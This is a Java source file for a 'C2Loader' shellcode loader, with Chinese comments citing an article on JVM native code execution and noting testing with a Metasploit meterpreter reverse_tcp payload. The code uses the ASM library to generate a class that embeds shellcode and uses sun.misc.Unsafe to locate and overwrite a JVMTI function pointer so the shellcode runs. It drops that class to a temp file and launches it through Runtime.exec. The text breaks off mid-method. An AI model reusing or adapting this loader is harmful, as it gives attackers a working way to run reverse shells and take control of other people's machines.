

import jdk.internal.org.objectweb.asm.*;
import java.io.*;


/**
 * shelcode 加载器， 参考 https://xz.aliyun.com/t/10075#toc-6 (Java跨平台任意Native代码执行)
 * 因为是使用了Unsafe方法,直接内存加载class文件可能导致服务宕机。
 * 故改用了先落地class文件，再执行java class，进行shellcode加载，以此来避免服务宕机。
 * 目前仅测试了ubuntu，jdk 1.8.0_251，msf linux/x86/meterpreter/reverse_tcp 效果还行,但因为落地了文件，切调用了命令，容易被检测。（期待师傅们后续补充指正）
 */
public class C2Loader{

    private static byte[] shellcode;
    public static boolean firstRun = true;


    public void run(){
        FileOutputStream stream = null;
        try{
            File file = File.createTempFile("C2Loader", ".class");
            String className = file.getName().substring(0, file.getName().length() - 6);
            String path = file.getParent();
            shellcode = dump(className, shellcode);
            stream = new FileOutputStream(file);
            stream.write(shellcode);
            Runtime.getRuntime().exec("java -classpath " + path + " " + className);
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            if(stream != null){
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }


    /**
     * ASM 加载class，原代码：
     *
     * import sun.misc.Unsafe;
     * import java.lang.instrument.ClassDefinition;
     * import java.lang.reflect.Constructor;
     * import java.lang.reflect.Field;
     * import java.lang.reflect.Method;
     * import java.util.HashMap;
     * import java.util.Map;
     *
     * public class C2Loader {
     *     public void test() throws Throwable {
     *
     *         byte buf[] = new byte[]{
     *                 (byte) 0xXX,
     *         };
     *         Unsafe unsafe = null;
     *         try {
     *             Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
     *             field.setAccessible(true);
     *             unsafe = (sun.misc.Unsafe) field.get(null);
     *         } catch (Exception e) {
     *             throw new AssertionError(e);
     *         }
     *
     *         long size = buf.length+0x178; // a long is 64 bits (http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)
     *         long allocateMemory = unsafe.allocateMemory(size);
     *         System.out.println("allocateMemory:"+Long.toHexString(allocateMemory));
     *
     *         Map map=new HashMap();
     *         map.put("X","y");
     *
     *         C2Loader c2loader = new C2Loader();
     *         for (int i=0;i<10000;i++)
     *         {
     *             c2loader.b(33);
     *         }
     *
     *         Thread.sleep(3000);
     *         for (int k=0; k<10000; k++)
     *         {
     *             long tmp = unsafe.allocateMemory(0x4000);
     *         }
     *
     *         long shellcodeBed = 0;
     *         int offset=4;
     *         for (int j=-0x1000;j<0x1000;j++)  //down search
     *         {
     *             long target=unsafe.getAddress(allocateMemory+j*offset);
     *             if (target%8>0)
     *             {
     *                 continue;
     *             }
     *             if (target>(allocateMemory&0xffffffff00000000l)&&target<(allocateMemory|0xffffffl))
     *             {
     *                 if ((target&0xffffffffff000000l)==(allocateMemory&0xffffffffff000000l))
     *                 {
     *                     continue;
     *                 }
     *                 if (Long.toHexString(target).indexOf("000000")>0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))
     *                 {
     *                     continue;
     *                 }
     * //                System.out.println("BYTE:"+unsafe.getByte(target));
     *                 //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));
     *                 if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48||unsafe.getByte(target)==(byte)0x66)
     *                 {
     *                     shellcodeBed=target;
     *                     break;
     *                 }
     *             }
     *         }
     *
     *         if (shellcodeBed==0)
     *         {
     *             for (int j=-0x100;j<0x800;j++)  //down search
     *             {
     *                 long target=unsafe.getAddress(allocateMemory+j*offset);
     *                 if (target%8>0)
     *                 {
     *                     continue;
     *                 }
     *                 if (target>(allocateMemory&0xffffffff00000000l)&&target<(allocateMemory|0xffffffffl))
     *                 {
     *                     if ((target&0xffffffffff000000l)==(allocateMemory&0xffffffffff000000l))
     *                     {
     *                         continue;
     *                     }
     *                     if (Long.toHexString(target).indexOf("0000000")>0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))
     *                     {
     *                         System.out.println("maybe error address,skip "+Long.toHexString(target));
     *                         continue;
     *                     }
     * //                    System.out.println("BYTE:"+unsafe.getByte(target));
     *                     //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));
     *                     if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48)
     *                     {
     *                         System.out.println("get bigger cache address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));
     *                         shellcodeBed=target;
     *                         break;
     *                     }
     *                 }
     *             }
     *         }
     *         System.out.println("find address end,address is "+Long.toHexString(shellcodeBed)+" mod 8 is:"+shellcodeBed%8);
     *
     *         String address="";
     *         allocateMemory=shellcodeBed;
     *         address=allocateMemory+"";
     *         Class cls=Class.forName("sun.instrument.InstrumentationImpl");
     *         Constructor constructor=cls.getDeclaredConstructors()[0];
     *         constructor.setAccessible(true);
     *         Object obj=constructor.newInstance(Long.parseLong(address),true,true);
     *         Method redefineMethod=cls.getMethod("redefineClasses",new Class[]{ClassDefinition[].class});
     *         ClassDefinition classDefinition=new ClassDefinition(Class.class, new byte[]{});
     *         ClassDefinition[] classDefinitions=new ClassDefinition[]{classDefinition};
     *         try
     *         {
     *             unsafe.putLong(allocateMemory+8,allocateMemory+0x10);  //set **jvmtienv point to it's next memory region
     *             unsafe.putLong(allocateMemory+8+8,allocateMemory+0x10); //set *jvmtienv point to itself
     *             unsafe.putLong(allocateMemory+0x10+0x168,allocateMemory+0x10+0x168+8); //overwrite allocate function pointer  to allocateMemory+0x10+0x168+8
     *             for (int k=0;k<buf.length;k++)
     *             {
     *                 unsafe.putByte(allocateMemory+0x10+0x168+8+k,buf[k]); //write shellcode to allocate function body
     *             }
     *             redefineMethod.invoke(obj,new Object[]{classDefinitions});  //trigger allocate
     *         }
     *         catch (Exception e)
     *         {
     *             e.printStackTrace();
     *         }
     *     }
     *     private int a(int x)
     *     {
     *         if (x>1)
     *         {
     *             // System.out.println("x>1");
     *         }
     *         else
     *         {
     *             // System.out.println("x<=1");
     *         }
     *         return x*1;
     *     }
     *     private void b(int x)
     *     {
     *         if (a(x)>1)
     *         {
     *             this.a(x);
     *         }
     *         else
     *         {
     *             this.a(x+4);
     *         }
     *     }
     *     public static void main(String[] args) throws Throwable {
     *         C2Loader t = new C2Loader();
     *         t.test();
     *     }
     * }
     *
     * @param className
     * @param shellcode
     * @return
     * @throws Exception
     */
    public static byte[] dump (String className, byte[] shellcode) throws Exception {

        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;
        AnnotationVisitor av0;

        cw.visit(52, 1 + 32, className, null, "java/lang/Object", null);

        {
            mv = cw.visitMethod(1, "<init>", "()V", null, null);
            mv.visitCode();
            mv.visitVarInsn(25, 0);
            mv.visitMethodInsn(183, "java/lang/Object", "<init>", "()V", false);
            mv.visitInsn(177);
            mv.visitMaxs(1, 1);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(1, "test", "()V", null, new String[] { "java/lang/Throwable" });
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            Label l4 = new Label();
            Label l5 = new Label();
            mv.visitTryCatchBlock(l3, l4, l5, "java/lang/Exception");

            mv.visitIntInsn(17, shellcode.length);
            mv.visitIntInsn(188, 8);

            for(int i=0;i<shellcode.length;i++) {
                mv.visitInsn(89);
                if (i < 128){
                    mv.visitIntInsn(16, i);
                }else{
                    mv.visitIntInsn(17, i);
                }
                mv.visitIntInsn(16, shellcode[i]);
                mv.visitInsn(84);
            }

            mv.visitVarInsn(58, 1);
            mv.visitInsn(1);
            mv.visitVarInsn(58, 2);
            mv.visitLabel(l0);
            mv.visitLdcInsn(Type.getType("Lsun/misc/Unsafe;"));
            mv.visitLdcInsn("theUnsafe");
            mv.visitMethodInsn(182, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(58, 3);
            mv.visitVarInsn(25, 3);
            mv.visitInsn(4);
            mv.visitMethodInsn(182, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            mv.visitVarInsn(25, 3);
            mv.visitInsn(1);
            mv.visitMethodInsn(182, "java/lang/reflect/Field", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(192, "sun/misc/Unsafe");
            mv.visitVarInsn(58, 2);
            mv.visitLabel(l1);
            Label l6 = new Label();
            mv.visitJumpInsn(167, l6);
            mv.visitLabel(l2);
            mv.visitFrame(0, 3, new Object[] {className, "[B", "sun/misc/Unsafe"}, 1, new Object[] {"java/lang/Exception"});
            mv.visitVarInsn(58, 3);
            mv.visitTypeInsn(187, "java/lang/AssertionError");
            mv.visitInsn(89);
            mv.visitVarInsn(25, 3);
            mv.visitMethodInsn(183, "java/lang/AssertionError", "<init>", "(Ljava/lang/Object;)V", false);
            mv.visitInsn(191);
            mv.visitLabel(l6);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(25, 1);
            mv.visitInsn(190);
            mv.visitIntInsn(17, 376);
            mv.visitInsn(96);
            mv.visitInsn(133);
            mv.visitVarInsn(55, 3);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 3);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "allocateMemory", "(J)J", false);
            mv.visitVarInsn(55, 5);
            mv.visitFieldInsn(178, "java/lang/System", "out", "Ljava/io/PrintStream;");
            mv.visitTypeInsn(187, "java/lang/StringBuilder");
            mv.visitInsn(89);
            mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitLdcInsn("allocateMemory:");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(22, 5);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
            mv.visitTypeInsn(187, "java/util/HashMap");
            mv.visitInsn(89);
            mv.visitMethodInsn(183, "java/util/HashMap", "<init>", "()V", false);
            mv.visitVarInsn(58, 7);
            mv.visitVarInsn(25, 7);
            mv.visitLdcInsn("X");
            mv.visitLdcInsn("y");
            mv.visitMethodInsn(185, "java/util/Map", "put", "(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;", true);
            mv.visitInsn(87);
            mv.visitTypeInsn(187, className);
            mv.visitInsn(89);
            mv.visitMethodInsn(183, className, "<init>", "()V", false);
            mv.visitVarInsn(58, 8);
            mv.visitInsn(3);
            mv.visitVarInsn(54, 9);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitFrame(0, 8, new Object[] {className, "[B", "sun/misc/Unsafe", new Integer(4), new Integer(4), "java/util/Map", className, new Integer(1)}, 0, new Object[] {});
            mv.visitVarInsn(21, 9);
            mv.visitIntInsn(17, 10000);
            Label l8 = new Label();
            mv.visitJumpInsn(162, l8);
            mv.visitVarInsn(25, 8);
            mv.visitIntInsn(16, 33);
            mv.visitMethodInsn(183, className, "b", "(I)V", false);
            mv.visitIincInsn(9, 1);
            mv.visitJumpInsn(167, l7);
            mv.visitLabel(l8);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitLdcInsn(new Long(3000L));
            mv.visitMethodInsn(184, "java/lang/Thread", "sleep", "(J)V", false);
            mv.visitInsn(3);
            mv.visitVarInsn(54, 9);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitFrame(1,1, new Object[] {new Integer(1)}, 0, null);
            mv.visitVarInsn(21, 9);
            mv.visitIntInsn(17, 10000);
            Label l10 = new Label();
            mv.visitJumpInsn(162, l10);
            mv.visitVarInsn(25, 2);
            mv.visitLdcInsn(new Long(16384L));
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "allocateMemory", "(J)J", false);
            mv.visitVarInsn(55, 10);
            mv.visitIincInsn(9, 1);
            mv.visitJumpInsn(167, l9);
            mv.visitLabel(l10);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitInsn(9);
            mv.visitVarInsn(55, 9);
            mv.visitInsn(7);
            mv.visitVarInsn(54, 11);
            mv.visitIntInsn(17, -4096);
            mv.visitVarInsn(54, 12);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitFrame(1,3, new Object[] {new Integer(4), new Integer(1), new Integer(1)}, 0, null);
            mv.visitVarInsn(21, 12);
            mv.visitIntInsn(17, 4096);
            Label l12 = new Label();
            mv.visitJumpInsn(162, l12);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 5);
            mv.visitVarInsn(21, 12);
            mv.visitVarInsn(21, 11);
            mv.visitInsn(104);
            mv.visitInsn(133);
            mv.visitInsn(97);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getAddress", "(J)J", false);
            mv.visitVarInsn(55, 13);
            mv.visitVarInsn(22, 13);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(113);
            mv.visitInsn(9);
            mv.visitInsn(148);
            Label l13 = new Label();
            mv.visitJumpInsn(158, l13);
            Label l14 = new Label();
            mv.visitJumpInsn(167, l14);
            mv.visitLabel(l13);
            mv.visitFrame(1,1, new Object[] {new Integer(4)}, 0, null);
            mv.visitVarInsn(22, 13);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(-4294967296L));
            mv.visitInsn(127);
            mv.visitInsn(148);
            mv.visitJumpInsn(158, l14);
            mv.visitVarInsn(22, 13);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(16777215L));
            mv.visitInsn(129);
            mv.visitInsn(148);
            mv.visitJumpInsn(156, l14);
            mv.visitVarInsn(22, 13);
            mv.visitLdcInsn(new Long(-16777216L));
            mv.visitInsn(127);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(-16777216L));
            mv.visitInsn(127);
            mv.visitInsn(148);
            Label l15 = new Label();
            mv.visitJumpInsn(154, l15);
            mv.visitJumpInsn(167, l14);
            mv.visitLabel(l15);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitLdcInsn("000000");
            mv.visitMethodInsn(182, "java/lang/String", "indexOf", "(Ljava/lang/String;)I", false);
            mv.visitJumpInsn(157, l14);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitLdcInsn("bebeb0");
            mv.visitMethodInsn(182, "java/lang/String", "endsWith", "(Ljava/lang/String;)Z", false);
            mv.visitJumpInsn(154, l14);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitLdcInsn("abebeb");
            mv.visitMethodInsn(182, "java/lang/String", "endsWith", "(Ljava/lang/String;)Z", false);
            Label l16 = new Label();
            mv.visitJumpInsn(153, l16);
            mv.visitJumpInsn(167, l14);
            mv.visitLabel(l16);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, 85);
            Label l17 = new Label();
            mv.visitJumpInsn(159, l17);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(17, 232);
            mv.visitJumpInsn(159, l17);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, -96);
            mv.visitJumpInsn(159, l17);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, 72);
            mv.visitJumpInsn(159, l17);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, 102);
            mv.visitJumpInsn(160, l14);
            mv.visitLabel(l17);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(22, 13);
            mv.visitVarInsn(55, 9);
            mv.visitJumpInsn(167, l12);
            mv.visitLabel(l14);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitIincInsn(12, 1);
            mv.visitJumpInsn(167, l11);
            mv.visitLabel(l12);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitVarInsn(22, 9);
            mv.visitInsn(9);
            mv.visitInsn(148);
            Label l18 = new Label();
            mv.visitJumpInsn(154, l18);
            mv.visitIntInsn(17, -256);
            mv.visitVarInsn(54, 12);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitFrame(1,1, new Object[] {new Integer(1)}, 0, null);
            mv.visitVarInsn(21, 12);
            mv.visitIntInsn(17, 2048);
            mv.visitJumpInsn(162, l18);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 5);
            mv.visitVarInsn(21, 12);
            mv.visitVarInsn(21, 11);
            mv.visitInsn(104);
            mv.visitInsn(133);
            mv.visitInsn(97);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getAddress", "(J)J", false);
            mv.visitVarInsn(55, 13);
            mv.visitVarInsn(22, 13);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(113);
            mv.visitInsn(9);
            mv.visitInsn(148);
            Label l20 = new Label();
            mv.visitJumpInsn(158, l20);
            Label l21 = new Label();
            mv.visitJumpInsn(167, l21);
            mv.visitLabel(l20);
            mv.visitFrame(1,1, new Object[] {new Integer(4)}, 0, null);
            mv.visitVarInsn(22, 13);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(-4294967296L));
            mv.visitInsn(127);
            mv.visitInsn(148);
            mv.visitJumpInsn(158, l21);
            mv.visitVarInsn(22, 13);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(4294967295L));
            mv.visitInsn(129);
            mv.visitInsn(148);
            mv.visitJumpInsn(156, l21);
            mv.visitVarInsn(22, 13);
            mv.visitLdcInsn(new Long(-16777216L));
            mv.visitInsn(127);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(-16777216L));
            mv.visitInsn(127);
            mv.visitInsn(148);
            Label l22 = new Label();
            mv.visitJumpInsn(154, l22);
            mv.visitJumpInsn(167, l21);
            mv.visitLabel(l22);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitLdcInsn("0000000");
            mv.visitMethodInsn(182, "java/lang/String", "indexOf", "(Ljava/lang/String;)I", false);
            Label l23 = new Label();
            mv.visitJumpInsn(157, l23);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitLdcInsn("bebeb0");
            mv.visitMethodInsn(182, "java/lang/String", "endsWith", "(Ljava/lang/String;)Z", false);
            mv.visitJumpInsn(154, l23);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitLdcInsn("abebeb");
            mv.visitMethodInsn(182, "java/lang/String", "endsWith", "(Ljava/lang/String;)Z", false);
            Label l24 = new Label();
            mv.visitJumpInsn(153, l24);
            mv.visitLabel(l23);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitFieldInsn(178, "java/lang/System", "out", "Ljava/io/PrintStream;");
            mv.visitTypeInsn(187, "java/lang/StringBuilder");
            mv.visitInsn(89);
            mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitLdcInsn("maybe error address,skip ");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
            mv.visitJumpInsn(167, l21);
            mv.visitLabel(l24);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, 85);
            Label l25 = new Label();
            mv.visitJumpInsn(159, l25);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(17, 232);
            mv.visitJumpInsn(159, l25);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, -96);
            mv.visitJumpInsn(159, l25);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitIntInsn(16, 72);
            mv.visitJumpInsn(160, l21);
            mv.visitLabel(l25);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitFieldInsn(178, "java/lang/System", "out", "Ljava/io/PrintStream;");
            mv.visitTypeInsn(187, "java/lang/StringBuilder");
            mv.visitInsn(89);
            mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitLdcInsn("get bigger cache address:");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn(",at :");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(22, 5);
            mv.visitVarInsn(21, 12);
            mv.visitVarInsn(21, 11);
            mv.visitInsn(104);
            mv.visitInsn(133);
            mv.visitInsn(101);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn(",BYTE:");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 13);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "getByte", "(J)B", false);
            mv.visitInsn(133);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
            mv.visitVarInsn(22, 13);
            mv.visitVarInsn(55, 9);
            mv.visitJumpInsn(167, l18);
            mv.visitLabel(l21);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitIincInsn(12, 1);
            mv.visitJumpInsn(167, l19);
            mv.visitLabel(l18);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitFieldInsn(178, "java/lang/System", "out", "Ljava/io/PrintStream;");
            mv.visitTypeInsn(187, "java/lang/StringBuilder");
            mv.visitInsn(89);
            mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitLdcInsn("find address end,address is ");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(22, 9);
            mv.visitMethodInsn(184, "java/lang/Long", "toHexString", "(J)Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn(" mod 8 is:");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitVarInsn(22, 9);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(113);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(J)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitMethodInsn(182, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
            mv.visitLdcInsn("");
            mv.visitVarInsn(58, 12);
            mv.visitVarInsn(22, 9);
            mv.visitVarInsn(55, 5);
            mv.visitTypeInsn(187, "java/lang/StringBuilder");
            mv.visitInsn(89);
            mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitVarInsn(22, 5);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(J)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn("");
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            mv.visitVarInsn(58, 12);
            mv.visitLdcInsn("sun.instrument.InstrumentationImpl");
            mv.visitMethodInsn(184, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(58, 13);
            mv.visitVarInsn(25, 13);
            mv.visitMethodInsn(182, "java/lang/Class", "getDeclaredConstructors", "()[Ljava/lang/reflect/Constructor;", false);
            mv.visitInsn(3);
            mv.visitInsn(50);
            mv.visitVarInsn(58, 14);
            mv.visitVarInsn(25, 14);
            mv.visitInsn(4);
            mv.visitMethodInsn(182, "java/lang/reflect/Constructor", "setAccessible", "(Z)V", false);
            mv.visitVarInsn(25, 14);
            mv.visitInsn(6);
            mv.visitTypeInsn(189, "java/lang/Object");
            mv.visitInsn(89);
            mv.visitInsn(3);
            mv.visitVarInsn(25, 12);
            mv.visitMethodInsn(184, "java/lang/Long", "parseLong", "(Ljava/lang/String;)J", false);
            mv.visitMethodInsn(184, "java/lang/Long", "valueOf", "(J)Ljava/lang/Long;", false);
            mv.visitInsn(83);
            mv.visitInsn(89);
            mv.visitInsn(4);
            mv.visitInsn(4);
            mv.visitMethodInsn(184, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitInsn(83);
            mv.visitInsn(89);
            mv.visitInsn(5);
            mv.visitInsn(4);
            mv.visitMethodInsn(184, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitInsn(83);
            mv.visitMethodInsn(182, "java/lang/reflect/Constructor", "newInstance", "([Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(58, 15);
            mv.visitVarInsn(25, 13);
            mv.visitLdcInsn("redefineClasses");
            mv.visitInsn(4);
            mv.visitTypeInsn(189, "java/lang/Class");
            mv.visitInsn(89);
            mv.visitInsn(3);
            mv.visitLdcInsn(Type.getType("[Ljava/lang/instrument/ClassDefinition;"));
            mv.visitInsn(83);
            mv.visitMethodInsn(182, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(58, 16);
            mv.visitTypeInsn(187, "java/lang/instrument/ClassDefinition");
            mv.visitInsn(89);
            mv.visitLdcInsn(Type.getType("Ljava/lang/Class;"));
            mv.visitInsn(3);
            mv.visitIntInsn(188, 8);
            mv.visitMethodInsn(183, "java/lang/instrument/ClassDefinition", "<init>", "(Ljava/lang/Class;[B)V", false);
            mv.visitVarInsn(58, 17);
            mv.visitInsn(4);
            mv.visitTypeInsn(189, "java/lang/instrument/ClassDefinition");
            mv.visitInsn(89);
            mv.visitInsn(3);
            mv.visitVarInsn(25, 17);
            mv.visitInsn(83);
            mv.visitVarInsn(58, 18);
            mv.visitLabel(l3);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(97);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(16L));
            mv.visitInsn(97);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "putLong", "(JJ)V", false);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(97);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(97);
